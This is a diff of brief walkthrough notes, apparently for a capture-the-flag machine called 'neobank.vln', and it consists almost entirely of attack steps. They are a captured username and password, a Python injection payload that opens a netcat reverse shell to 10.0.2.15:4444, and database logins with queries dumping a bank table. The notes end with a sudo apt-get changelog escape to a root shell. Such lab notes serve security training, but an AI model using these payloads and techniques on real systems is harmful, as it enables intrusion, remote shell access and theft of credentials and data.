@@ -25,15 +25,17 @@ with open('/home/alienum/Desktop/users.txt') as users:
 
 [+] Username : zeus@neobank.vln
 [+] Password : 246810
-#4
- __import__('os').system('nc -e /bin/sh 10.0.2.15 4444')
 #5
+google authenticator, scan the qrcode and insert the otp code
+#6
+__import__('os').system('nc -e /bin/sh 10.0.2.15 4444')
+#7
 cat /var/www/html/main.py
 banker:neobank1
 mysql -u banker -pneobank1
 use bank;
 select * from system;
 banker:adv1se.me
-#6 
+#8
 sudo apt-get changelog apt
 !/bin/sh
